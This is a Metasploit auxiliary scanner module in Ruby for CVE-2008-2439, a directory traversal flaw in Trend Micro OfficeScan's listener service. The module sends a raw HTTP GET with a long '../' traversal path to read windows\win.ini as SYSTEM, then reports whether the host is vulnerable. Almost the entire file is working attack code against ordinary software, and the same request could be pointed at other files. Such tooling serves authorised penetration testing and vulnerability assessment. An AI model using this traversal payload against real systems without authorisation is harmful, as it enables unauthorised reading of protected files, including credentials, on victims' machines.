##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access',
      'Description' => %q{
          This module tests for directory traversal vulnerability in the UpdateAgent
        function in the OfficeScanNT Listener (TmListen.exe) service in Trend Micro
        OfficeScan. This allows remote attackers to read arbitrary files as SYSTEM
        via dot dot sequences in an HTTP request.
      },
      'References'  =>
        [
          [ 'OSVDB', '48730' ],
          [ 'CVE', '2008-2439' ],
          [ 'BID', '31531' ],
          [ 'URL', 'http://www.trendmicro.com/ftp/documentation/readme/OSCE_7.3_Win_EN_CriticalPatch_B1372_Readme.txt' ],
        ],
      'Author'      => [ 'Anshul Pandey <anshul999[at]gmail.com>', 'aushack' ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(26122),
      ])
  end

  def run_host(target_host)

    res = send_request_raw(
      {
        'uri'     => '/activeupdate/../../../../../../../../../../../windows\\win.ini',
        'method'  => 'GET',
      }, 20)

    if not res
      print_error("No response from server")
      return
    end

    http_fingerprint({ :response => res })

    if (res.code >= 200)
      if (res.body =~ /for 16-bit app support/)
        vuln = "vulnerable."
      else
        vuln = "not vulnerable."
      end
      if (res.headers['Server'])
        print_status("http://#{target_host}:#{rport} is running #{res.headers['Server']} and is #{vuln}")
      end
    end
  end
end
